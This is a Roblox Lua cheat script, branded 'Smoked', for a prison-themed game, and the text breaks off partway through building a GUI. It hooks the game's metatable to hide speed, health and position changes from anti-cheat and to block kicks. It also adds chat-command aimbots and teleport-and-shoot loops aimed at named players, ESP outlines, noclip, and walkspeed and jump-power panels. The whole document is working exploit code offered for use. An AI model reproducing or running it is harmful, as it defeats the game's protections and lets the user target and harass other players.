--[[
Smoked, the Prison script.
Creators of Smoked are: dollar#0007 and lilfatherfigure#5863 Thanks to bypass.
This script will be updated every 2 days. So expect new stuff everday.
Rip. VelyZena You Were A Good Friend.
]]

--[[
███████╗███╗   ███╗ ██████╗ ██╗  ██╗███████╗██████╗ 
██╔════╝████╗ ████║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
███████╗██╔████╔██║██║   ██║█████╔╝ █████╗  ██║  ██║
╚════██║██║╚██╔╝██║██║   ██║██╔═██╗ ██╔══╝  ██║  ██║
███████║██║ ╚═╝ ██║╚██████╔╝██║  ██╗███████╗██████╔╝
╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ 
                                                    
]]

----------------

local rm = getrawmetatable(game)
local caller = checkcaller or is_protosmasher_caller
local rindex = rm.__index
local nindex = rm.__newindex 
local ncall = rm.__namecall
setreadonly(rm, false)

rm.__newindex = newcclosure(function(self, Meme, Val)
    if not caller() then
    if Meme == "WalkSpeed" then
        return 16
    end
    if Meme == "JumpPower" then
        return 37.5
    end
    if Meme == "HipHeight" then
        return 0 
    end
    if Meme == "Health" then
        return 100
    end
    if tostring(self) == "HumanoidRootPart" or tostring(self) == "Torso" then 
        if Meme == "CFrame" then 
            return 
        end
    end
end
    return nindex(self, Meme, Val) 
end)
game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
rm.__namecall = newcclosure(function(self, ...)
    local Method = getnamecallmethod()
    local Agts = {...}
    
    if Method == "BreakJoints" or Method == "Kick" then
        return wait(9e9)
    end
    if Method == "FireServer" and not tostring(self) == "SayMessageRequest" then
        if tostring(self.Parent) == "ReplicatedStorage" then
            return wait(9e9)
        end
        if Agts[1] == "hey" then
            return wait(9e9)
        end
    end
    return ncall(self, ...)
end)
setreadonly(rm, true)


targetee = nil
pleaseshoot = false
mouse = game.Players.LocalPlayer:GetMouse()
 
local TargetGUI = Instance.new("ScreenGui")
local Target = Instance.new("TextBox")
local Background = Instance.new("ImageLabel")
 
TargetGUI.Name = "TargetGUI"
TargetGUI.Parent = game.CoreGui
 
 
 
 
local debounce = false
function fireat(target)
if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Fire then
u = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Fire
if target.Character then
				u:FireServer(targetee.Character.Torso.CFrame + targetee.Character.HumanoidRootPart.Velocity/8) 
end
end
end
 
end
 
 
Target.FocusLost:Connect(function()
local name = string.lower(Target.Text)
local player = nil
 
names = game.Players:GetChildren()
 
                            for i,x in pairs(names) do
                                strlower = string.lower(x.Name)
                                sub = string.sub(strlower,1,#name)                      
 
                                if name == sub then 
                                    player = x
                                    if player.Name ~= game.Players.LocalPlayer.Name and x.Name ~= "iceyskuls" then
                                     	targetee = player
                                    end
                                end
                            end
end)
 
function ShootGlocks(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.E and gameProcessedEvent == false then
	fireat(targetee)
    end
end
function UnShootGlocks(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.E and gameProcessedEvent == false then
	pleaseshoot = false
    end
end
function CtrlSelect(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.Q and gameProcessedEvent == false then
	Selecting = true
    end
end
function UnCtrlSelect(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.Q and gameProcessedEvent == false then
	Selecting = false
    end
end
 
 
 
game:GetService("UserInputService").InputBegan:connect(ShootGlocks)
game:GetService("UserInputService").InputEnded:connect(UnShootGlocks)
game:GetService("UserInputService").InputBegan:connect(CtrlSelect)
game:GetService("UserInputService").InputEnded:connect(UnCtrlSelect)
 
---------------------
----------------------
 
function onKeyPress(inputObject, gameProcessedEvent)
    if gameProcessedEvent == false then
        if inputObject.KeyCode == Enum.KeyCode.C then
            game.Players.LocalPlayer.Character:BreakJoints()
        end
    end
end
 
game:GetService("UserInputService").InputBegan:connect(onKeyPress)
 
mouse.Button2Down:Connect(function()
    rightclickdown = true
    local donemouse = false
    if mouse.Target ~= nil then
        if mouse.Target:FindFirstAncestor("Door") then
            local door = mouse.Target:FindFirstAncestor("Door")
            if door:FindFirstChild("Lock") and LocalP:DistanceFromCharacter(mouse.Target.CFrame.p) < 10 then
                if door:FindFirstChild("Lock"):FindFirstChild("ClickDetector") then
                    if door:FindFirstChild("Lock"):FindFirstChild("ClickDetector"):FindFirstChild("RemoteEvent") then
                        door:FindFirstChild("Lock"):FindFirstChild("ClickDetector"):FindFirstChild("RemoteEvent"):FireServer()
                        donemouse = true
                    end
                end
            end
        end
    end     
    if LocalP.Character ~= nil and (game.Workspace.CurrentCamera.Focus.p - game.Workspace.CurrentCamera.CoordinateFrame.p).Magnitude <= 1 and donemouse == false and not LocalP.Character:FindFirstChild("Super Uzi") then
        if LocalP.Character:FindFirstChildWhichIsA("Tool") then
            local Tool = LocalP.Character:FindFirstChildWhichIsA("Tool")
            if Tool:FindFirstChild("Fire") then
                if Tool.Name ~= "Uzi" then
                    local opp = GetNearestPlayerToMouse()
                    if opp ~= nil then
                        if opp.Character ~= nil then
                            if opp.Character:FindFirstChild("HumanoidRootPart") then
                                Tool:FindFirstChild("Fire"):FireServer(opp.Character[targetpart].CFrame + opp.Character.HumanoidRootPart.Velocity/5)
                            else
                                Tool:FindFirstChild("Fire"):FireServer(opp.Character[targetpart].CFrame + opp.Character.Torso.Velocity/5)
                            end
                        end
                    end
                elseif Tool.Name == "Uzi" then
                    shootuzi = true
                    if not Tool:FindFirstChild("UziUnequip") then
                        local Monitor = Instance.new("BoolValue", Tool)
                        Monitor.Name = "UziUnequip"
                        Tool.Unequipped:Connect(function()
                            shootuzi = false
                        end)
                    end
                end
            end
        end
    end
end)
------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
if (string.lower(msg) == "+fov 100") then
local amount = fovamount
 
game:GetService'Workspace'.Camera.FieldOfView = 100
end
end)
---------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
if (string.lower(msg) == "+bluesky") then
local lighting = game.Lighting
        if lighting:FindFirstChild("ColorCorrection") then
            lighting:FindFirstChild("ColorCorrection"):Remove()
        end
        if lighting:FindFirstChild("Correction") then
            lighting:FindFirstChild("Correction"):Remove()
        end
 
        local sunray = Instance.new("SunRaysEffect", lighting)
        local sky = lighting.Sky
        sky.SkyboxBk = "http://www.roblox.com/asset/?id=185544271"
        sky.SkyboxDn = "http://www.roblox.com/asset/?id=185544298"
        sky.SkyboxFt = "http://www.roblox.com/asset/?id=185544329"
        sky.SkyboxLf = "http://www.roblox.com/asset/?id=185544349"
        sky.SkyboxRt = "http://www.roblox.com/asset/?id=185544367"
        sky.SkyboxUp = "http://www.roblox.com/asset/?id=185544404"
 
        sky.StarCount = 3000
        sky.SunAngularSize = 21
        sky.MoonAngularSize = 11
 
        local correction = Instance.new("ColorCorrectionEffect", lighting)
        correction.Name = "Correction"
        correction.Saturation = -0.4
        correction.TintColor = Color3.fromRGB(224, 241, 255)
        end
end)  
    ---------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
if (string.lower(msg) == "+nodoors") then
for i,v in pairs(workspace:GetChildren())do
    if v.Name == "Door" or v.Name == "Window" or v.Name == "Windows" or v.Name == "Plants" then
        v:Destroy()
    end
end
 
for i,v in pairs(workspace:GetChildren())do
    if v.Name == "Model" then
        for i,v in pairs(v:GetChildren())do
            if v.Name == "Door" or v.Name == "Window" or v.Name == "Windows" then
                v:Destroy()
            end
        end
    end
end
end
end)
----------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
if (string.lower(msg) == "+gunanims") then
local lplr = game:GetService("Players").LocalPlayer
local shotty = lplr.Backpack:FindFirstChild("Shotty")
local Animation = Instance.new("Animation")
Animation.AnimationId = "rbxassetid://503259904"
local plr = game:GetService('Players').LocalPlayer
local HUM = plr.Character.Humanoid:LoadAnimation(Animation)
shotty.Equipped:connect(function()
    wait(.1)
    HUM:Play()
    HUM:AdjustSpeed(0.0)
end)
shotty.Unequipped:connect(function()
    HUM:Stop()
end)
local lplr = game:GetService("Players").LocalPlayer
local Glock = lplr.Backpack:FindFirstChild("Glock")
local Animation = Instance.new("Animation")
Animation.AnimationId = "rbxassetid://503259904"
local plr = game:GetService('Players').LocalPlayer
local HUM = plr.Character.Humanoid:LoadAnimation(Animation)
Glock.Equipped:connect(function()
    wait(.1)
    HUM:Play()
    HUM:AdjustSpeed(0.0)
end)
Glock.Unequipped:connect(function()
    HUM:Stop()
end)
end
end)
---------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
if (string.lower(msg) == "+rejoin") then
local Tp = game:GetService("TeleportService")
local placeID = 4669040
 
Tp:Teleport(placeID,game.Players.LocalPlayer)
end
end)
---------------
 
local NoclipKey = "x" -- Type a letter in the quotes to change the key that'll toggle noclip
 
 
 
------------------------------------
local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()
 
    mouse.KeyDown:connect(function(key)
        if key:lower() == "h"   then
	 local part = Instance.new("Part",game.Players.LocalPlayer.Character.Torso)
part.CFrame = game.Players.LocalPlayer.Character.Torso.CFrame * CFrame.new(0,-3,0)
part.Size = Vector3.new(500,1,500)
part.Transparency = 1
part.Anchored = true
 
end
end)
 
------------------------------------
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.find(msg,"+s ") then -- finds ,s typed
        local name = string.gsub(msg,"+s ", "") -- removes ,s and focuses on name of plr 
        for i,v in pairs (game.Players:GetChildren()) do -- gets all player names
            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then -- shortens the length of name
                game.Players.LocalPlayer.Backpack.Shotty.Parent = game.Players.LocalPlayer.Character
                for i = 1,450 do
                    while true do
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,7)
wait()
 
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,-7)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(-7,0, 0)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(7,0,0)
wait()
 
        game.Players.LocalPlayer.Character.Shotty.Fire:FireServer(v.Character.Head.CFrame)
end
                end
            end
        end
 
    end
end)
 
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.find(msg,"+g ") then -- finds ,s typed
        local name = string.gsub(msg,"+g ", "") -- removes ,s and focuses on name of plr 
        for i,v in pairs (game.Players:GetChildren()) do -- gets all player names
            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then -- shortens the length of name
                game.Players.LocalPlayer.Backpack.Glock.Parent = game.Players.LocalPlayer.Character
                for i = 1,450 do
                    while true do
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,7)
wait()
 
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Torso.CFrame + Vector3.new(0,0,-7)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(-7,0, 0)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  v.Character.Torso.CFrame + Vector3.new(7,0,0)
wait()
 
 
        game.Players.LocalPlayer.Character.Glock.Fire:FireServer(v.Character.Head.CFrame)
end
                end
            end
        end
 
    end
end)
------------------------------------
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
	if (string.lower(msg) == "+streets") then
		local Tp = game:GetService("TeleportService")
local placeID = 455366377
 
Tp:Teleport(placeID,game.Players.LocalPlayer)
	end
end)
---------
local c = Instance.new("Camera")
local camera = workspace.CurrentCamera
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.find(msg,"+view") then  
        local name = string.gsub(msg,"+view ", "")  
        for i,v in pairs (game.Players:GetChildren()) do  
            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then 
camera.CameraSubject = v.Character
end
end
end
end)
 
local c = Instance.new("Camera")
local camera = workspace.CurrentCamera
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.find(msg,"+unview") then  
        local name = string.gsub(msg,"+unview ", "")  
        for i,v in pairs (game.Players:GetChildren()) do  
            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then 
camera.CameraSubject = game.Players.LocalPlayer.Character
end
end
end
end)
---
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
 if string.find(msg,"+esp") then  
 local name = string.gsub(msg,"+esp ", "")  
 for i,v in pairs (game.Players:GetChildren()) do  
 if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then 
------------- see all players
v.Character.Humanoid.HealthDisplayDistance = 200
v.Character.Humanoid.NameDisplayDistance = 200
------------
local BillboardGui = Instance.new("BillboardGui")
local TextLabel = Instance.new("TextLabel")
BillboardGui.Parent = v.Character.Head
BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
BillboardGui.Active = true
BillboardGui.Adornee = v.Character.Head
BillboardGui.AlwaysOnTop = true
BillboardGui.ExtentsOffset = Vector3.new(0, 1.29999995, 0)
BillboardGui.LightInfluence = 1.000
BillboardGui.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Parent = BillboardGui
TextLabel.Active = true
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.SciFi
TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.TextSize = 37.000
TextLabel.Text = v.Name
-------------------------------------------------------- esp box
local spark = Instance.new("Sparkles",v.Character.Torso)
 spark.SparkleColor = Color3.fromRGB(0,255,0)
local i = Instance.new("SelectionBox",workspace)
i.Adornee = v.Character.Torso
i.LineThickness = 0
i.SurfaceTransparency = .8
i.Transparency = 1
i.Color3 = Color3.fromRGB(0,0,0)
i.SurfaceColor3 = Color3.fromRGB(0,255,0) 
local c = Instance.new("SelectionBox",workspace)
c.Adornee =  v.Character["Left Leg"]
c.LineThickness = 0
c.SurfaceTransparency = .8
c.Color3 = Color3.fromRGB(0,0,0)
c.SurfaceColor3 = Color3.fromRGB(0,255,0)
c.Transparency = 1
local d = Instance.new("SelectionBox",workspace)
d.Adornee = v.Character["Right Leg"]
d.LineThickness = 0
d.SurfaceTransparency = .8
d.Color3 = Color3.fromRGB(0,0,0)
d.SurfaceColor3 = Color3.fromRGB(0,255,0)
d.Transparency = 1
local e = Instance.new("SelectionBox",workspace)
e.Adornee = v.Character["Right Arm"]
e.LineThickness = 0
e.SurfaceTransparency = .8
e.Color3 = Color3.fromRGB(0,0,0)
e.SurfaceColor3 = Color3.fromRGB(0,255,0)
e.Transparency = 1
local f = Instance.new("SelectionBox",workspace)
f.Adornee = v.Character["Left Arm"]
f.LineThickness = 0
f.SurfaceTransparency = .8
f.Color3 = Color3.fromRGB(0,0,0)
f.SurfaceColor3 = Color3.fromRGB(0,255,0)
f.Transparency = 1
local h = Instance.new("SelectionBox",workspace)
h.Adornee = v.Character["Head"]
h.LineThickness = 0
h.SurfaceTransparency = .8
h.Color3 = Color3.fromRGB(0,0,0)
h.SurfaceColor3 = Color3.fromRGB(0,255,0)
h.Transparency = 1
-----------------------------------------------
end
end
end
end)
-----------------------------------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
if (string.lower(msg) == "+unbluesky") then
game.Lighting.ColorCorrection.Enabled = false 
end
end)
------------------------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
if (string.lower(msg) == "+stam") then
	for i = 1,75 do
		wait()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace["Greenbull | $12"].Head.CFrame * CFrame.new(0,0,-2)
	end
end
end)
-----------------------------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
    if (string.lower(msg) == "+god") then
        rs.Heartbeat:Connect(function()
    local ll =game.Players.LocalPlayer.Character:FindFirstChild("Right Leg")
    ll:Destroy()
end)

    end
end)
--------------------------------------------------------
game:GetService("StarterGui"):SetCore("SendNotification", {
		    Title = "Smoked.";
		    Text = "Smoked Paid Loaded. (;";
			})
			------------------------------------
			game:GetService("StarterGui"):SetCore("SendNotification", {
		    Title = "Enjoy!";
		    Text = "F9 For Commands (+) Is Preflix! (;";
			})
			--------------------------------
			game:GetService("StarterGui"):SetCore("SendNotification", {
		    Title = "Updates.";
		    Text = "God, Fly (Again) Walkspeed, Updated Aimlock(;";
			})
			-----------------
 game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+fov 70") then
local amount = fovamount

game:GetService'Workspace'.Camera.FieldOfView = 70
end
end)
----------------------
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.find(msg,"+aim ") then -- finds ,s typed
        local name = string.gsub(msg,"+aim ", "") -- removes ,s and focuses on name of plr 
        for i,v in pairs (game.Players:GetChildren()) do -- gets all player names
            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then -- shortens the length of name
        if game.Players.LocalPlayer.Character.Glock then
            while true do 
                wait()
             game.Players.LocalPlayer.Character.Glock.Fire:FireServer(v.Character.Head.CFrame)
            end

end
end
end
end
end)


-- shotty aimbot
     game.Players.LocalPlayer.Chatted:Connect(function(m)
    if string.find(m,"+aim ") then -- finds ,s typed
        local name = string.gsub(m,"+aim ", "") -- removes ,s and focuses on name of plr 
        for i,v in pairs (game.Players:GetChildren()) do -- gets all player names
            if string.sub(string.lower(v.Name) , 1, string.len(name)) == string.lower(name) then -- shortens the length of name
        if game.Players.LocalPlayer.Character.Shotty then
            while true do
                wait()
             game.Players.LocalPlayer.Character.Shotty.Fire:FireServer(v.Character.Head.CFrame)
            end

end
end
end
end
end)
--------------
local rs = game:GetService("RunService")
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
    if (string.lower(msg) == "+godmode") then
        rs.Heartbeat:Connect(function()
    local ll =game.Players.LocalPlayer.Character:FindFirstChild("Right Leg")
    ll:Destroy()
end)

    end
end)
--------------------
game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
    if KeyPressed == "c" then
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end
end)
-------------------------------
local NoclipKey = "x" -- Type a letter in the quotes to change the key that'll toggle noclip



------------------------------------

repeat wait() until game.Players ~= nil
repeat wait() until game.Players.LocalPlayer ~= nil

local LocalP = game.Players.LocalPlayer
local Mouse = LocalP:GetMouse()
local NoClip = false
NoclipKey = string.lower(NoclipKey)
local fakevalue = Instance.new("BoolValue")
fakevalue.Value = false

local meta = getrawmetatable(game)
if PROTOSMASHER_LOADED then
    make_writeable(meta)
else
    setreadonly(meta,false)
end
local index = meta.__index

meta.__index=function(self,k)
    if not checkcaller() or not is_protosmasher_caller() then
        if tostring(self) == "Part" and tostring(k) == "Anchored" then
            return index(fakevalue,"Value")
        end
    end
    return index(self,k)
end

Mouse.KeyDown:Connect(function(key)
    if key == NoclipKey then
        NoClip = not NoClip
        local currenttext = ""
        if NoClip == true then
            currenttext = "on"
        else
            currenttext = "off"
        end
        game.StarterGui:SetCore("SendNotification", {
            Title = "notification";
            Text = currenttext;
            Icon = "rbxassetid://2541869220";
            Duration = 3;
        })
    end
end)

game:GetService('RunService').Stepped:connect(function()
    if NoClip == true then
        if LocalP.Character ~= nil then
            if LocalP.Character:FindFirstChild("Head") and LocalP.Character:FindFirstChild("Torso") and LocalP.Character:FindFirstChild("Humanoid") then
                LocalP.Character.Head.CanCollide = false
                LocalP.Character.Torso.CanCollide = false
                LocalP.Character.Humanoid.Sit = false
            end
        end
    end
end)
----------------------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+wsgui") then

local Hacks = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local Walkspeedlb = Instance.new("TextLabel")
local jumppowerlb = Instance.new("TextLabel")
local speed = Instance.new("TextLabel")
local jump = Instance.new("TextLabel")
local WalkBox = Instance.new("TextBox")
local JumpBox = Instance.new("TextBox")
local WalkSumbit = Instance.new("TextButton")
local JumpSumbit = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local Open = Instance.new("TextButton")
--Properties:
Hacks.Name = "Hacks"
Hacks.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Hacks.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
Background.Name = "Background"
Background.Parent = Hacks
Background.BackgroundColor3 = Color3.new(0, 0, 0)
Background.BackgroundTransparency = 0.40000000596046
Background.Position = UDim2.new(0.109510086, 0, 0.381112367, 0)
Background.Size = UDim2.new(0.222958699, 0, 0.476163864, 0)
Background.Visible = false
 
Walkspeedlb.Name = "Walkspeedlb"
Walkspeedlb.Parent = Background
Walkspeedlb.BackgroundColor3 = Color3.new(1, 1, 1)
Walkspeedlb.BackgroundTransparency = 1
Walkspeedlb.Position = UDim2.new(0, 0, 0.122436516, 0)
Walkspeedlb.Size = UDim2.new(0.999999762, 0, 0.100000001, 0)
Walkspeedlb.Visible = false
Walkspeedlb.Font = Enum.Font.SourceSans
Walkspeedlb.Text = "WalkSpeed:"
Walkspeedlb.TextColor3 = Color3.new(1, 1, 1)
Walkspeedlb.TextScaled = true
Walkspeedlb.TextSize = 14
Walkspeedlb.TextWrapped = true
Walkspeedlb.TextXAlignment = Enum.TextXAlignment.Left
 
jumppowerlb.Name = "jumppowerlb"
jumppowerlb.Parent = Background
jumppowerlb.BackgroundColor3 = Color3.new(1, 1, 1)
jumppowerlb.BackgroundTransparency = 1
jumppowerlb.Position = UDim2.new(0, 0, 0.2203857, 0)
jumppowerlb.Size = UDim2.new(0.999999762, 0, 0.100000001, 0)
jumppowerlb.Visible = false
jumppowerlb.Font = Enum.Font.SourceSans
jumppowerlb.Text = "Jump Power:"
jumppowerlb.TextColor3 = Color3.new(1, 1, 1)
jumppowerlb.TextScaled = true
jumppowerlb.TextSize = 14
jumppowerlb.TextWrapped = true
jumppowerlb.TextXAlignment = Enum.TextXAlignment.Left
 
speed.Name = "speed"
speed.Parent = Background
speed.BackgroundColor3 = Color3.new(1, 1, 1)
speed.BackgroundTransparency = 1
speed.Position = UDim2.new(0.577337444, 0, 0.122436516, 0)
speed.Size = UDim2.new(0.422662586, 0, 0.100000001, 0)
speed.Visible = false
speed.Font = Enum.Font.SourceSans
speed.Text = "Default"
speed.TextColor3 = Color3.new(1, 1, 1)
speed.TextScaled = true
speed.TextSize = 14
speed.TextWrapped = true
 
jump.Name = "jump"
jump.Parent = Background
jump.BackgroundColor3 = Color3.new(1, 1, 1)
jump.BackgroundTransparency = 1
jump.Position = UDim2.new(0.659198582, 0, 0.22038573, 0)
jump.Size = UDim2.new(0.340801179, 0, 0.100000001, 0)
jump.Visible = false
jump.Font = Enum.Font.SourceSans
jump.Text = "Default"
jump.TextColor3 = Color3.new(1, 1, 1)
jump.TextScaled = true
jump.TextSize = 14
jump.TextWrapped = true
 
WalkBox.Name = "WalkBox"
WalkBox.Parent = Background
WalkBox.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
WalkBox.BackgroundTransparency = 0.5
WalkBox.BorderSizePixel = 0
WalkBox.Position = UDim2.new(0, 0, 0.174571082, 0)
WalkBox.Size = UDim2.new(0.999999881, 0, 0.187969327, 0)
WalkBox.Font = Enum.Font.SourceSans
WalkBox.PlaceholderColor3 = Color3.new(1, 1, 1)
WalkBox.PlaceholderText = "Insert a number for walk speed"
WalkBox.Text = ""
WalkBox.TextColor3 = Color3.new(1, 1, 1)
WalkBox.TextScaled = true
WalkBox.TextSize = 14
WalkBox.TextWrapped = true
 
JumpBox.Name = "JumpBox"
JumpBox.Parent = Background
JumpBox.BackgroundColor3 = Color3.new(0.333333, 0.333333, 0.333333)
JumpBox.BackgroundTransparency = 0.5
JumpBox.BorderSizePixel = 0
JumpBox.Position = UDim2.new(0.00430848775, 0, 0.6280002, 0)
JumpBox.Size = UDim2.new(0.999999881, 0, 0.190235019, 0)
JumpBox.Font = Enum.Font.SourceSans
JumpBox.PlaceholderColor3 = Color3.new(1, 1, 1)
JumpBox.PlaceholderText = "Insert a number for jump power"
JumpBox.Text = ""
JumpBox.TextColor3 = Color3.new(1, 1, 1)
JumpBox.TextScaled = true
JumpBox.TextSize = 14
JumpBox.TextWrapped = true
 
WalkSumbit.Name = "WalkSumbit"
WalkSumbit.Parent = Background
WalkSumbit.BackgroundColor3 = Color3.new(0.0980392, 1, 0)
WalkSumbit.Position = UDim2.new(0.00430848775, 0, 0.402936816, 0)
WalkSumbit.Size = UDim2.new(0.995691121, 0, 0.155913889, 0)
WalkSumbit.Font = Enum.Font.SourceSans
WalkSumbit.Text = "Sumbit"
WalkSumbit.TextColor3 = Color3.new(0, 0, 0)
WalkSumbit.TextScaled = true
WalkSumbit.TextSize = 14
WalkSumbit.TextWrapped = true
 
JumpSumbit.Name = "JumpSumbit"
JumpSumbit.Parent = Background
JumpSumbit.BackgroundColor3 = Color3.new(0.0980392, 1, 0)
JumpSumbit.Position = UDim2.new(0, 0, 0.84706986, 0)
JumpSumbit.Size = UDim2.new(0.995691121, 0, 0.151039571, 0)
JumpSumbit.Font = Enum.Font.SourceSans
JumpSumbit.Text = "Sumbit"
JumpSumbit.TextColor3 = Color3.new(0, 0, 0)
JumpSumbit.TextScaled = true
JumpSumbit.TextSize = 14
JumpSumbit.TextWrapped = true
 
TextLabel.Parent = Background
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Size = UDim2.new(0.995690882, 0, 0.135462731, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Smoked Walkspeed."
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true
 
Open.Name = "Open"
Open.Parent = Hacks
Open.BackgroundColor3 = Color3.new(139, 0, 0)
Open.BackgroundTransparency = 0.44999998807907
Open.Position = UDim2.new(0, 0, 0.756052136, 0)
Open.Size = UDim2.new(0.100000001, 0, 0.0553072728, 0)
Open.Font = Enum.Font.SourceSans
Open.Text = "Open"
Open.TextColor3 = Color3.new(1, 1, 1)
Open.TextScaled = true
Open.TextSize = 14
Open.TextWrapped = true
-- Scripts:
 
local playername = game.Players.LocalPlayer.Name
local player = game.Players.LocalPlayer
local character = game.Workspace[playername]
local Background = player.PlayerGui.Hacks.Background
 
Open.MouseButton1Click:Connect(function()
	if game.Players.LocalPlayer.PlayerGui.Hacks.Background.Visible == true then
		game.Players.LocalPlayer.PlayerGui.Hacks.Open.Text = "Open"
		game.Players.LocalPlayer.PlayerGui.Hacks.Background.Visible = false
	else
		game.Players.LocalPlayer.PlayerGui.Hacks.Open.Text = "Close"
		game.Players.LocalPlayer.PlayerGui.Hacks.Background.Visible = true
	end
end)
 
WalkSumbit.MouseButton1Click:connect(function()
	character.Humanoid.WalkSpeed = tostring(Background.WalkBox.Text)
end)
 
JumpSumbit.MouseButton1Click:connect(function()
	character.Humanoid.JumpPower = tostring(Background.JumpBox.Text)
end)
end
end)
------------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+wc") then


local FirstScript = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Gravity = Instance.new("TextButton")
local Close = Instance.new("TextButton")
local WalkSpeed = Instance.new("TextButton")
local PaintBall = Instance.new("TextButton")
local Fly = Instance.new("TextButton")
local Openmain = Instance.new("Frame")
local Open = Instance.new("TextButton")
 
--Properties:
 
FirstScript.Name = "FirstScript"
FirstScript.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
FirstScript.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
main.Name = "main"
main.Parent = FirstScript
main.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
main.Position = UDim2.new(0.24222587, 0, 0.460580945, 0)
main.Size = UDim2.new(0, 509, 0, 284)
main.Visible = false
 
Title.Name = "Title"
Title.Parent = main
Title.BackgroundColor3 = Color3.fromRGB(251, 255, 0)
Title.Size = UDim2.new(0, 509, 0, 50)
Title.Font = Enum.Font.GothamBold
Title.Text = "JailHaxx"
Title.TextColor3 = Color3.fromRGB(0, 0, 0)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true
 
Gravity.Name = "Gravity"
Gravity.Parent = main
Gravity.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
Gravity.Position = UDim2.new(0.0137524558, 0, 0.254409373, 0)
Gravity.Size = UDim2.new(0, 200, 0, 50)
Gravity.Font = Enum.Font.GothamBold
Gravity.Text = "Gravity"
Gravity.TextColor3 = Color3.fromRGB(0, 0, 0)
Gravity.TextScaled = true
Gravity.TextSize = 14.000
Gravity.TextWrapped = true
 
Close.Name = "Close"
Close.Parent = main
Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Close.Position = UDim2.new(0.903732836, 0, 0, 0)
Close.Size = UDim2.new(0, 49, 0, 41)
Close.Font = Enum.Font.GothamBold
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextScaled = true
Close.TextSize = 14.000
Close.TextWrapped = true
 
WalkSpeed.Name = "WalkSpeed"
WalkSpeed.Parent = main
WalkSpeed.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
